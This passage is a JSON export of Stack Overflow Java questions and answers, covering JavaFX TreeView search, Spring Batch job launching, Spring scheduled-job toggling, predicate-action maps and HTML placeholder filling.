java.util.Date()).getTime() - oldDate.getTime()\n</code></pre>\n\n<p>However, this just leaves me with a <code>long</code> representing milliseconds. Is there any simpler, nicer way to get a time delta?</p>\n"},{"tags":["java","dictionary","switch-statement","java-stream","language-agnostic"],"answers":[{"tags":[],"owner":{"account_id":17520379,"reputation":1536,"user_id":12706564,"display_name":"Emanuel Trandafir"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1681900229,"creation_date":1681900229,"answer_id":76053450,"question_id":76052119,"body_markdown":"It&#39;s an interesting approach, I sometimes do it for filters or mappers. The only thing I would change would be to avoid using a `Map` if you don&#39;t really need one (what would be the hashcode of your Predicate - it can be looked up, but still, it&#39;s not super straightforward). \r\n\r\nInstead, you can put the Predicate and the Consumer in some sort of `Pair&lt;&gt;` or `Tuple&lt;&gt;`, or even create your own structure:\r\n\r\n    record PossibleAction&lt;T&gt;(\r\n    \t\tPredicate&lt;T&gt; predicate,\r\n    \t\tConsumer&lt;T&gt; action\r\n    ) {\r\n        // if you use a custom structure you can define these methods\r\n        // and use .appliesFor(data) instead of using .getPredicate().test(data)\r\n    \tpublic boolean appliesFor(T data) {\r\n    \t\treturn predicate.test(data);\r\n    \t}\r\n    \r\n    \tpublic void apply(T data) {\r\n    \t\taction.accept(data);\r\n    \t}\r\n    }\r\n\r\nNow you can have a list of these `PossibleActions`:\r\n\r\n    List&lt;PossibleAction&lt;String&gt;&gt; actions = List.of(\r\n    \tnew PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;A&quot;), s -&gt; System.out.println(&quot;1&quot;) ),\r\n    \tnew PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;B&quot;), s -&gt; System.out.println(&quot;2&quot;) ),\r\n    \tnew PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;C&quot;), s -&gt; System.out.println(&quot;3&quot;) )\r\n    );\r\n\r\nAnd you can use this, as pointed out by you in the initial post:\r\n\r\n    void performActions(String data) {\r\n    \tactions.stream()\r\n    \t\t\t.filter(a -&gt; a.appliesFor(data))\r\n    \t\t\t.forEach(a -&gt; a.apply(data));\r\n    }","title":"Using Map/Dictionary as an alternative to switch case","body":"<p>It's an interesting approach, I sometimes do it for filters or mappers. The only thing I would change would be to avoid using a <code>Map</code> if you don't really need one (what would be the hashcode of your Predicate - it can be looked up, but still, it's not super straightforward).</p>\n<p>Instead, you can put the Predicate and the Consumer in some sort of <code>Pair&lt;&gt;</code> or <code>Tuple&lt;&gt;</code>, or even create your own structure:</p>\n<pre><code>record PossibleAction&lt;T&gt;(\n        Predicate&lt;T&gt; predicate,\n        Consumer&lt;T&gt; action\n) {\n    // if you use a custom structure you can define these methods\n    // and use .appliesFor(data) instead of using .getPredicate().test(data)\n    public boolean appliesFor(T data) {\n        return predicate.test(data);\n    }\n\n    public void apply(T data) {\n        action.accept(data);\n    }\n}\n</code></pre>\n<p>Now you can have a list of these <code>PossibleActions</code>:</p>\n<pre><code>List&lt;PossibleAction&lt;String&gt;&gt; actions = List.of(\n    new PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;A&quot;), s -&gt; System.out.println(&quot;1&quot;) ),\n    new PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;B&quot;), s -&gt; System.out.println(&quot;2&quot;) ),\n    new PossibleAction&lt;&gt;(s -&gt; s.contains(&quot;C&quot;), s -&gt; System.out.println(&quot;3&quot;) )\n);\n</code></pre>\n<p>And you can use this, as pointed out by you in the initial post:</p>\n<pre><code>void performActions(String data) {\n    actions.stream()\n            .filter(a -&gt; a.appliesFor(data))\n            .forEach(a -&gt; a.apply(data));\n}\n</code></pre>\n"}],"owner":{"account_id":13964622,"reputation":49,"user_id":10084790,"display_name":"Shmuel Greenberger"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":104,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"accepted_answer_id":76053450,"answer_count":1,"score":2,"last_activity_date":1683713395,"creation_date":1681891770,"question_id":76052119,"body_markdown":"At the risk of this being an opinion based question, would creating a Map/dictionary where the keys are predicates and the values the action to be made be a good and viable substitute for switch case?\r\n\r\nFor example (following Java Map) :\r\n\r\n```Java\r\n    Map.of(predicate1, action1, ... predicateN, actionN)\r\n    .entrySet().stream()\r\n    .filter(e -&gt; e.getKey()).findAny()\r\n    .ifPresentOrElseThrow().getValue();\r\n```","title":"Using Map/Dictionary as an alternative to switch case","body":"<p>At the risk of this being an opinion based question, would creating a Map/dictionary where the keys are predicates and the values the action to be made be a good and viable substitute for switch case?</p>\n<p>For example (following Java Map) :</p>\n<pre><code>    Map.of(predicate1, action1, ... predicateN, actionN)\n    .entrySet().stream()\n    .filter(e -&gt; e.getKey()).findAny()\n    .ifPresentOrElseThrow().getValue();\n</code></pre>\n"},{"tags":["java","javafx","treeview"],"comments":[{"owner":{"account_id":6331425,"reputation":4910,"user_id":5901848,"display_name":"Sanchit Patiyal"},"score":1,"creation_date":1511338501,"post_id":47429634,"comment_id":81813899,"body_markdown":"Did you try passing `Desktop` with capital D as value?","body":"Did you try passing <code>Desktop</code> with capital D as value?"},{"owner":{"account_id":6410016,"reputation":7025,"user_id":4970079,"accept_rate":76,"display_name":"GOXR3PLUS"},"score":0,"creation_date":1511338759,"post_id":47429634,"comment_id":81814026,"body_markdown":"@SanchitPatiyal I am trying it my friend it always returns null , i can&#39;t find why this method doesn&#39;t work . Any better solution is appreciated :)","body":"@SanchitPatiyal I am trying it my friend it always returns null , i can&#39;t find why this method doesn&#39;t work . Any better solution is appreciated :)"},{"owner":{"account_id":3583958,"reputation":80987,"user_id":2991525,"display_name":"fabian"},"score":3,"creation_date":1511345365,"post_id":47429634,"comment_id":81818028,"body_markdown":"Any idea why @AnastasiosVlasopoulos deleted his answer? It basically seems correct (except for one missing closing `}` and doing an unnecessary test), i.e. you need to consider the value returned from `getTreeViewItem(child, value)` as potential solutions in order to do a proper depth first search.","body":"Any idea why @AnastasiosVlasopoulos deleted his answer? It basically seems correct (except for one missing closing <code>}</code> and doing an unnecessary test), i.e. you need to consider the value returned from <code>getTreeViewItem(child, value)</code> as potential solutions in order to do a proper depth first search."},{"owner":{"account_id":6410016,"reputation":7025,"user_id":4970079,"accept_rate":76,"display_name":"GOXR3PLUS"},"score":0,"creation_date":1511346524,"post_id":47429634,"comment_id":81818818,"body_markdown":"@fabian I haven&#39;t seen it at all .... deleted too fast..","body":"@fabian I haven&#39;t seen it at all .... deleted too fast.."}],"answers":[{"tags":[],"owner":{"account_id":12219032,"reputation":111,"user_id":8918577,"display_name":"dark.semiQ"},"down_vote_count":0,"up_vote_count":8,"is_accepted":true,"score":8,"last_activity_date":1521816144,"creation_date":1521816144,"answer_id":49452269,"question_id":47429634,"body_markdown":"I know this is old but i am going to answer this To help others.\r\n\r\n    public static TreeItem getTreeViewItem(TreeItem&lt;String&gt; item , String value) \r\n    {\r\n      if (item != null &amp;&amp; item.getValue().equals(value))\r\n        return  item;\r\n\r\n      for (TreeItem&lt;String&gt; child : item.getChildren()){\r\n       TreeItem&lt;String&gt; s=getTreeViewItem(child, value);\r\n       if(s!=null)\r\n           return s;\r\n       \r\n      }\r\n      return null;\r\n    }\r\n\r\n","title":"JavaFX TreeView find TreeItem in any depth matching a given value","body":"<p>I know this is old but i am going to answer this To help others.</p>\n\n<pre><code>public static TreeItem getTreeViewItem(TreeItem&lt;String&gt; item , String value) \n{\n  if (item != null &amp;&amp; item.getValue().equals(value))\n    return  item;\n\n  for (TreeItem&lt;String&gt; child : item.getChildren()){\n   TreeItem&lt;String&gt; s=getTreeViewItem(child, value);\n   if(s!=null)\n       return s;\n\n  }\n  return null;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1834386,"reputation":121,"user_id":1665048,"display_name":"lisyara"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1557392665,"creation_date":1557392665,"answer_id":56055905,"question_id":47429634,"body_markdown":"    public static &lt;T&gt; TreeItem&lt;T&gt; getTreeViewItem(TreeItem&lt;T&gt; item, T value) {\r\n        if (item != null) {\r\n            if (item.getValue().equals(value)) return item;\r\n            for (TreeItem&lt;T&gt; child : item.getChildren()) {\r\n                TreeItem&lt;T&gt; s = getTreeViewItem(child, value);\r\n                if (s != null) {\r\n                    return s;\r\n                }\r\n            }\r\n        }\r\n        return null;\r\n    }","title":"JavaFX TreeView find TreeItem in any depth matching a given value","body":"<pre><code>public static &lt;T&gt; TreeItem&lt;T&gt; getTreeViewItem(TreeItem&lt;T&gt; item, T value) {\n    if (item != null) {\n        if (item.getValue().equals(value)) return item;\n        for (TreeItem&lt;T&gt; child : item.getChildren()) {\n            TreeItem&lt;T&gt; s = getTreeViewItem(child, value);\n            if (s != null) {\n                return s;\n            }\n        }\n    }\n    return null;\n}\n</code></pre>\n"}],"owner":{"account_id":6410016,"reputation":7025,"user_id":4970079,"accept_rate":76,"display_name":"GOXR3PLUS"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":4744,"favorite_count":0,"down_vote_count":0,"up_vote_count":3,"accepted_answer_id":49452269,"answer_count":2,"score":3,"last_activity_date":1683713350,"creation_date":1511338117,"question_id":47429634,"body_markdown":"I am trying to create a method that does what title says . Let&#39;s say i have the below TreeView , i want to add a search functionality , in which the user can give for example a value`desktop` and using that method to get the first TreeItem which has the given value `treeItem.getValue();`\r\n\r\n\r\n**I need exactly this `treeView.getChildren_InAnyDepth_MatchingValue(&quot;value&quot;);`.**\r\n\r\nLet&#39;s say i want it to start searching from the root of the TreeView.\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n---\r\n\r\nJava Code :\r\n\r\n\r\n    /**\r\n    * Find the first TreeItem matching the given value\r\n    * \r\n    * @param item\r\n    */\r\n    public TreeItem getTreeViewItem(TreeItem&lt;String&gt; item , String value) {\r\n    \tif (item != null &amp;&amp; item.getValue().equals(value))\r\n    \t\treturn  item;\r\n    \t\t\t\t\r\n    \tfor (TreeItem&lt;String&gt; child : item.getChildren())\r\n    \t\tgetTreeViewItem(child, value);\r\n    \t\t\t\t\r\n    \treturn null;\r\n    }\r\n\r\n\r\n**The above code always returns null for some reason , i can&#39;t figure out 6 hours now .**\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/EZQPR.png\r\n\r\n","title":"JavaFX TreeView find TreeItem in any depth matching a given value","body":"<p>I am trying to create a method that does what title says . Let's say i have the below TreeView , i want to add a search functionality , in which the user can give for example a value<code>desktop</code> and using that method to get the first TreeItem which has the given value <code>treeItem.getValue();</code></p>\n<p><strong>I need exactly this <code>treeView.getChildren_InAnyDepth_MatchingValue(&quot;value&quot;);</code>.</strong></p>\n<p>Let's say i want it to start searching from the root of the TreeView.</p>\n<p><a href=\"https://i.stack.imgur.com/EZQPR.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/EZQPR.png\" alt=\"enter image description here\" /></a></p>\n<hr />\n<p>Java Code :</p>\n<pre><code>/**\n* Find the first TreeItem matching the given value\n* \n* @param item\n*/\npublic TreeItem getTreeViewItem(TreeItem&lt;String&gt; item , String value) {\n    if (item != null &amp;&amp; item.getValue().equals(value))\n        return  item;\n                \n    for (TreeItem&lt;String&gt; child : item.getChildren())\n        getTreeViewItem(child, value);\n                \n    return null;\n}\n</code></pre>\n<p><strong>The above code always returns null for some reason , i can't figure out 6 hours now .</strong></p>\n"},{"tags":["java","spring-boot","spring-batch"],"comments":[{"owner":{"account_id":6482932,"reputation":29552,"user_id":5019386,"display_name":"Mahmoud Ben Hassine"},"score":0,"creation_date":1561969833,"post_id":56824266,"comment_id":100216594,"body_markdown":"I&#39;m not sure why you need such an aspect. The job launcher already checks if there is a running execution for the given job instance and throws a `JobExecutionAlreadyRunningException` if any. By default, spring batch won&#39;t allow you to run two concurrent executions of the same job instance at the same time. Can you elaborate on what you mean by &quot;not re-entrant&quot;?","body":"I&#39;m not sure why you need such an aspect. The job launcher already checks if there is a running execution for the given job instance and throws a <code>JobExecutionAlreadyRunningException</code> if any. By default, spring batch won&#39;t allow you to run two concurrent executions of the same job instance at the same time. Can you elaborate on what you mean by &quot;not re-entrant&quot;?"},{"owner":{"account_id":82452,"reputation":15242,"user_id":231821,"accept_rate":92,"display_name":"Jim"},"score":0,"creation_date":1561991946,"post_id":56824266,"comment_id":100227736,"body_markdown":"the `JobExecutionAlreadyRunningException` is thrown when the same parameters are used to start the job, and it&#39;s already running. The exception doesn&#39;t help me though, because it is also thrown if the application dies, and the job finished unsuccessfully. It can then never be restarted with the same parameters again. I need to know if it&#39;s actually running, not if the last run was a fail. I have to manually alter the database to let it run again.","body":"the <code>JobExecutionAlreadyRunningException</code> is thrown when the same parameters are used to start the job, and it&#39;s already running. The exception doesn&#39;t help me though, because it is also thrown if the application dies, and the job finished unsuccessfully. It can then never be restarted with the same parameters again. I need to know if it&#39;s actually running, not if the last run was a fail. I have to manually alter the database to let it run again."},{"owner":{"account_id":82452,"reputation":15242,"user_id":231821,"accept_rate":92,"display_name":"Jim"},"score":0,"creation_date":1561992004,"post_id":56824266,"comment_id":100227754,"body_markdown":"The aspect seems to actually check if the job is running, not if it ever ran in the past and didn&#39;t finish.","body":"The aspect seems to actually check if the job is running, not if it ever ran in the past and didn&#39;t finish."},{"owner":{"account_id":6482932,"reputation":29552,"user_id":5019386,"display_name":"Mahmoud Ben Hassine"},"score":0,"creation_date":1562056994,"post_id":56824266,"comment_id":100247697,"body_markdown":"Getting a `JobExecutionAlreadyRunningException` because of a previous killed execution is another story. By default, the job launcher will check if there is a currently running execution and prevent you from starting another one (even if there are no previous killed executions). If you still need to double check before launching the job, see my answer. Hope it helps.","body":"Getting a <code>JobExecutionAlreadyRunningException</code> because of a previous killed execution is another story. By default, the job launcher will check if there is a currently running execution and prevent you from starting another one (even if there are no previous killed executions). If you still need to double check before launching the job, see my answer. Hope it helps."}],"answers":[{"tags":[],"owner":{"account_id":6482932,"reputation":29552,"user_id":5019386,"display_name":"Mahmoud Ben Hassine"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1683713329,"creation_date":1562056775,"answer_id":56848499,"question_id":56824266,"body_markdown":"What you can do is override the `SimpleJobLauncher#run` method and add the double check before running the job:\r\n\r\n\t@Bean\r\n\tpublic JobLauncher jobLauncher(JobRepository jobRepository, JobExplorer jobExplorer) {\r\n\t\tSimpleJobLauncher simpleJobLauncher = new SimpleJobLauncher() {\r\n\t\t\t@Override\r\n\t\t\tpublic JobExecution run(Job job, JobParameters jobParameters) throws JobExecutionAlreadyRunningException, JobRestartException, JobInstanceAlreadyCompleteException, JobParametersInvalidException {\r\n\t\t\t\tSet&lt;JobExecution&gt; running = jobExplorer.findRunningJobExecutions(job.getName());\r\n\t\t\t\tif (!running.isEmpty()) {\r\n\t\t\t\t\tthrow new JobExecutionAlreadyRunningException(&quot;An instance of this job is already active: &quot; + job.getName());\r\n\t\t\t\t}\r\n\t\t\t\treturn super.run(job, jobParameters);\r\n\t\t\t}\r\n\t\t};\r\n\t\tsimpleJobLauncher.setJobRepository(jobRepository);\r\n        simpleJobLauncher.setTaskExecutor(new SimpleAsyncTaskExecutor());\r\n        simpleJobLauncher.afterPropertiesSet();\r\n\t\treturn simpleJobLauncher;\r\n\t}\r\n\r\nNote this is similar to the code in the aspect you shared but without needing any kind of AOP. As I mentioned in the comment, this check is already done in `super.run(job, jobParameters)`, so we are only adding a double check here.\r\n","title":"how do I use JobLauncherSynchronizer in spring admin","body":"<p>What you can do is override the <code>SimpleJobLauncher#run</code> method and add the double check before running the job:</p>\n<pre><code>@Bean\npublic JobLauncher jobLauncher(JobRepository jobRepository, JobExplorer jobExplorer) {\n    SimpleJobLauncher simpleJobLauncher = new SimpleJobLauncher() {\n        @Override\n        public JobExecution run(Job job, JobParameters jobParameters) throws JobExecutionAlreadyRunningException, JobRestartException, JobInstanceAlreadyCompleteException, JobParametersInvalidException {\n            Set&lt;JobExecution&gt; running = jobExplorer.findRunningJobExecutions(job.getName());\n            if (!running.isEmpty()) {\n                throw new JobExecutionAlreadyRunningException(&quot;An instance of this job is already active: &quot; + job.getName());\n            }\n            return super.run(job, jobParameters);\n        }\n    };\n    simpleJobLauncher.setJobRepository(jobRepository);\n    simpleJobLauncher.setTaskExecutor(new SimpleAsyncTaskExecutor());\n    simpleJobLauncher.afterPropertiesSet();\n    return simpleJobLauncher;\n}\n</code></pre>\n<p>Note this is similar to the code in the aspect you shared but without needing any kind of AOP. As I mentioned in the comment, this check is already done in <code>super.run(job, jobParameters)</code>, so we are only adding a double check here.</p>\n"}],"owner":{"account_id":82452,"reputation":15242,"user_id":231821,"accept_rate":92,"display_name":"Jim"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":278,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":56848499,"answer_count":1,"score":0,"last_activity_date":1683713329,"creation_date":1561892070,"question_id":56824266,"body_markdown":"There is an `@Aspect` that ensures that jobs in spring boot are not re-entrant. It is implemented in [JobLauncherSynchronizer.java][1] and documented [here][2]. It is in the spring batch admin artifact.\r\n\r\nMy Job is created through a `@Bean` as follows:\r\n\r\n\r\n    @Bean\r\n    @Qualifier(&quot;synchronisationLauncher&quot;)\r\n    public JobLauncher synchronisationLauncher() throws Exception {\r\n        SimpleJobLauncher jobLauncher = new SimpleJobLauncher();\r\n        jobLauncher.setJobRepository(jobRepository);\r\n        jobLauncher.setTaskExecutor(new SimpleAsyncTaskExecutor());\r\n        jobLauncher.afterPropertiesSet();\r\n        return jobLauncher;\r\n    }\r\n\r\nMy question:  \r\n**how do I integrate the `@Aspect` into my JobLauncher?**\r\n\r\nI naively tried to new it up, and set the properties in the method above, not surprisingly that didn&#39;t work very well. I was able to launch multiple instances.\r\n\r\nMy launch code is:\r\n\r\n    // dependencies from constructor.\r\n    // the launcher is qualified to &#39;synchronisationLauncher&#39;\r\n    private JobLauncher launcher;\r\n    private Job mergeJob;\r\n    private JobQueryHelper jobQueryHelper;\r\n\r\n    @PostMapping(&quot;uri&quot;)\r\n    public ResponseEntity&lt;APIResponse&gt; SynchroniseRetailers()\r\n            throws JobParametersInvalidException,\r\n                   JobExecutionAlreadyRunningException,\r\n                   JobRestartException,\r\n                   JobInstanceAlreadyCompleteException {\r\n\r\n        JobParametersBuilder builder = new JobParametersBuilder()\r\n                .addLong(&quot;run.id&quot;, jobQueryHelper.findLastBatchExecutionIndex() + 1);\r\n        launcher.run(mergeJob, builder.toJobParameters());\r\n        return buildEmptyResponse();\r\n    }\r\n\r\n\r\n  [1]: https://github.com/spring-attic/spring-batch-admin/blob/master/spring-batch-admin-manager/src/main/java/org/springframework/batch/admin/launch/JobLauncherSynchronizer.java\r\n  [2]: https://docs.spring.io/spring-batch-admin/trunk/apidocs/org/springframework/batch/admin/launch/JobLauncherSynchronizer.html\r\n","title":"how do I use JobLauncherSynchronizer in spring admin","body":"<p>There is an <code>@Aspect</code> that ensures that jobs in spring boot are not re-entrant. It is implemented in <a href=\"https://github.com/spring-attic/spring-batch-admin/blob/master/spring-batch-admin-manager/src/main/java/org/springframework/batch/admin/launch/JobLauncherSynchronizer.java\" rel=\"nofollow noreferrer\">JobLauncherSynchronizer.java</a> and documented <a href=\"https://docs.spring.io/spring-batch-admin/trunk/apidocs/org/springframework/batch/admin/launch/JobLauncherSynchronizer.html\" rel=\"nofollow noreferrer\">here</a>. It is in the spring batch admin artifact.</p>\n\n<p>My Job is created through a <code>@Bean</code> as follows:</p>\n\n<pre><code>@Bean\n@Qualifier(\"synchronisationLauncher\")\npublic JobLauncher synchronisationLauncher() throws Exception {\n    SimpleJobLauncher jobLauncher = new SimpleJobLauncher();\n    jobLauncher.setJobRepository(jobRepository);\n    jobLauncher.setTaskExecutor(new SimpleAsyncTaskExecutor());\n    jobLauncher.afterPropertiesSet();\n    return jobLauncher;\n}\n</code></pre>\n\n<p>My question:<br>\n<strong>how do I integrate the <code>@Aspect</code> into my JobLauncher?</strong></p>\n\n<p>I naively tried to new it up, and set the properties in the method above, not surprisingly that didn't work very well. I was able to launch multiple instances.</p>\n\n<p>My launch code is:</p>\n\n<pre><code>// dependencies from constructor.\n// the launcher is qualified to 'synchronisationLauncher'\nprivate JobLauncher launcher;\nprivate Job mergeJob;\nprivate JobQueryHelper jobQueryHelper;\n\n@PostMapping(\"uri\")\npublic ResponseEntity&lt;APIResponse&gt; SynchroniseRetailers()\n        throws JobParametersInvalidException,\n               JobExecutionAlreadyRunningException,\n               JobRestartException,\n               JobInstanceAlreadyCompleteException {\n\n    JobParametersBuilder builder = new JobParametersBuilder()\n            .addLong(\"run.id\", jobQueryHelper.findLastBatchExecutionIndex() + 1);\n    launcher.run(mergeJob, builder.toJobParameters());\n    return buildEmptyResponse();\n}\n</code></pre>\n"},{"tags":["java"],"owner":{"account_id":25486631,"reputation":101,"user_id":19282140,"display_name":"java developer 111"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":14,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1683713237,"creation_date":1683711691,"question_id":76216952,"body_markdown":"I have a simple html file like this\r\n\r\n      &lt;td style=&quot;width: 59.4824%; height: 28px;&quot; data-mce-style=&quot;width: 59.4824%; height: 28px;&quot;&gt;&lt;span\r\n                    style=&quot;font-size: 18pt;&quot; data-mce-style=&quot;font-size: 18pt;&quot;&gt;Boss &lt;span\r\n                    style=&quot;text-decoration: underline;&quot; data-mce-style=&quot;text-decoration: underline;&quot;&gt;{boss.name}&lt;/span&gt;&lt;/span&gt;\r\n            &lt;/td&gt;\r\n\r\nthat placed in spring boot project folder resources \r\n\r\ni need to get it from it, replace {boss.name} with java object boss.getName() and convert it to w3c Document\r\n\r\nwhat is the best way to do these steps?\r\n\r\nps.It is print form that will be convert to pdf file after these steps","title":"Get html file from project resource, fill placeholders and convert it to w3c document","body":"<p>I have a simple html file like this</p>\n<pre><code>  &lt;td style=&quot;width: 59.4824%; height: 28px;&quot; data-mce-style=&quot;width: 59.4824%; height: 28px;&quot;&gt;&lt;span\n                style=&quot;font-size: 18pt;&quot; data-mce-style=&quot;font-size: 18pt;&quot;&gt;Boss &lt;span\n                style=&quot;text-decoration: underline;&quot; data-mce-style=&quot;text-decoration: underline;&quot;&gt;{boss.name}&lt;/span&gt;&lt;/span&gt;\n        &lt;/td&gt;\n</code></pre>\n<p>that placed in spring boot project folder resources</p>\n<p>i need to get it from it, replace {boss.name} with java object boss.getName() and convert it to w3c Document</p>\n<p>what is the best way to do these steps?</p>\n<p>ps.It is print form that will be convert to pdf file after these steps</p>\n"},{"tags":["java","spring","cron","scheduled-tasks"],"comments":[{"owner":{"account_id":330400,"reputation":851,"user_id":654495,"accept_rate":67,"display_name":"Kias"},"score":0,"creation_date":1390268111,"post_id":18406713,"comment_id":32008887,"body_markdown":"Did you ever find an answer for this?","body":"Did you ever find an answer for this?"},{"owner":{"account_id":122100,"reputation":16858,"user_id":315677,"accept_rate":81,"display_name":"Pierre Henry"},"score":1,"creation_date":1391164648,"post_id":18406713,"comment_id":32416541,"body_markdown":"@Chaos : Nope, still using extra boolean property for this.","body":"@Chaos : Nope, still using extra boolean property for this."},{"owner":{"account_id":435987,"reputation":1349,"user_id":822870,"accept_rate":33,"display_name":"David Balažic"},"score":1,"creation_date":1484322179,"post_id":18406713,"comment_id":70476219,"body_markdown":"&quot;a cron pattern that would never evaluate&quot; this does not work, the spring scheduler code requires a valid &quot;next run date&quot; otherwise it throws an exception. (might not be true for all versions)","body":"&quot;a cron pattern that would never evaluate&quot; this does not work, the spring scheduler code requires a valid &quot;next run date&quot; otherwise it throws an exception. (might not be true for all versions)"},{"owner":{"account_id":1189564,"reputation":301,"user_id":1162725,"accept_rate":25,"display_name":"Dean"},"score":0,"creation_date":1613758717,"post_id":18406713,"comment_id":117184643,"body_markdown":"I know this was written a long time ago but it still shows up when searching for a solution. You may want to consider using a different scheduling mechanism. You can roll your own using Spring and Quartz (or other mechanisms I&#39;ve recently seen while searching for this) or use a solution like https://github.com/kagkarlsson/db-scheduler. I haven&#39;t tried this yet by I will be soon since I need a solution for a new project.","body":"I know this was written a long time ago but it still shows up when searching for a solution. You may want to consider using a different scheduling mechanism. You can roll your own using Spring and Quartz (or other mechanisms I&#39;ve recently seen while searching for this) or use a solution like <a href=\"https://github.com/kagkarlsson/db-scheduler\" rel=\"nofollow noreferrer\">github.com/kagkarlsson/db-scheduler</a>. I haven&#39;t tried this yet by I will be soon since I need a solution for a new project."}],"answers":[{"tags":[],"owner":{"account_id":905416,"reputation":25876,"user_id":940428,"accept_rate":100,"display_name":"Prabhakaran Ramaswamy"},"down_vote_count":2,"up_vote_count":52,"is_accepted":true,"score":50,"last_activity_date":1519034713,"creation_date":1377272979,"answer_id":18406954,"question_id":18406713,"body_markdown":" \r\n    @Component\r\n    public class ImagesPurgeJob implements Job {\r\n\r\n        private Logger logger = Logger.getLogger(this.getClass());\r\n    \r\n        @Value(&quot;${jobs.mediafiles.imagesPurgeJob.enable}&quot;)\r\n        private boolean imagesPurgeJobEnable;\r\n         \r\n        @Override\r\n        @Transactional(readOnly=true)\r\n        @Scheduled(cron = &quot;${jobs.mediafiles.imagesPurgeJob.schedule}&quot;)\r\n        public void execute() {\r\n\r\n             //Do something\r\n            //can use DAO or other autowired beans here\r\n            if(imagesPurgeJobEnable){\r\n\r\n                Do your conditional job here...\r\n\r\n            }\r\n        }\r\n    }","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<pre><code>@Component\npublic class ImagesPurgeJob implements Job {\n\n    private Logger logger = Logger.getLogger(this.getClass());\n\n    @Value(\"${jobs.mediafiles.imagesPurgeJob.enable}\")\n    private boolean imagesPurgeJobEnable;\n\n    @Override\n    @Transactional(readOnly=true)\n    @Scheduled(cron = \"${jobs.mediafiles.imagesPurgeJob.schedule}\")\n    public void execute() {\n\n         //Do something\n        //can use DAO or other autowired beans here\n        if(imagesPurgeJobEnable){\n\n            Do your conditional job here...\n\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":264189,"reputation":6632,"user_id":550282,"display_name":"aweigold"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1377291801,"creation_date":1377291801,"answer_id":18411810,"question_id":18406713,"body_markdown":"Your question states to condition the actual creation of the bean.  You can do this easily with this parameter by using @Profile if you are using at least Spring 3.1.\r\n\r\nSee the documentation here: http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/context/annotation/Profile.html","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>Your question states to condition the actual creation of the bean.  You can do this easily with this parameter by using @Profile if you are using at least Spring 3.1.</p>\n\n<p>See the documentation here: <a href=\"http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/context/annotation/Profile.html\" rel=\"nofollow\">http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/context/annotation/Profile.html</a></p>\n"},{"tags":[],"owner":{"account_id":1543247,"reputation":452,"user_id":1437395,"display_name":"tmullin"},"down_vote_count":0,"up_vote_count":35,"is_accepted":false,"score":35,"last_activity_date":1668962282,"creation_date":1404757098,"answer_id":24617132,"question_id":18406713,"body_markdown":"Spring Boot provides [@ConditionalOnProperty](http://docs.spring.io/spring-boot/docs/1.1.1.RELEASE/api/org/springframework/boot/autoconfigure/condition/ConditionalOnProperty.html), which would be perfect if you were using Spring Boot. This annotation is a specialization of [@Conditional](http://docs.spring.io/spring/docs/4.0.0.RELEASE/javadoc-api/org/springframework/context/annotation/Conditional.html), introduced with Spring 4.0.0.\r\n\r\nAssuming you&#39;re just using &quot;regular&quot; spring and not Spring Boot, you could create your own `Condition` implementation for use with `@Conditional` that would mimic Spring Boot&#39;s `@ConditionalOnProperty`.","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>Spring Boot provides <a href=\"http://docs.spring.io/spring-boot/docs/1.1.1.RELEASE/api/org/springframework/boot/autoconfigure/condition/ConditionalOnProperty.html\" rel=\"nofollow noreferrer\">@ConditionalOnProperty</a>, which would be perfect if you were using Spring Boot. This annotation is a specialization of <a href=\"http://docs.spring.io/spring/docs/4.0.0.RELEASE/javadoc-api/org/springframework/context/annotation/Conditional.html\" rel=\"nofollow noreferrer\">@Conditional</a>, introduced with Spring 4.0.0.</p>\n<p>Assuming you're just using &quot;regular&quot; spring and not Spring Boot, you could create your own <code>Condition</code> implementation for use with <code>@Conditional</code> that would mimic Spring Boot's <code>@ConditionalOnProperty</code>.</p>\n"},{"tags":[],"owner":{"account_id":1519401,"reputation":585,"user_id":1419528,"accept_rate":40,"display_name":"Oleg"},"down_vote_count":0,"up_vote_count":41,"is_accepted":false,"score":41,"last_activity_date":1668962243,"creation_date":1425064849,"answer_id":28772675,"question_id":18406713,"body_markdown":"You can group schedule methods by conditions into number of services and init them like this:\r\n\r\n\r\n    @Service\r\n    @ConditionalOnProperty(&quot;yourConditionPropery&quot;)\r\n    public class SchedulingService {\r\n    \r\n      @Scheduled\r\n      public void task1() {...}\r\n    \r\n      @Scheduled\r\n      public void task2() {...}\r\n    \r\n    }","title":"How to conditionally enable or disable scheduled jobs in Spring?","body":"<p>You can group schedule methods by conditions into number of services and init them like this:</p>\n<pre><code>@Service\n@ConditionalOnProperty(&quot;yourConditionPropery&quot;)\npublic class SchedulingService {\n\n  @Scheduled\n  public void task1() {...}\n\n  @Scheduled\n  public void task2() 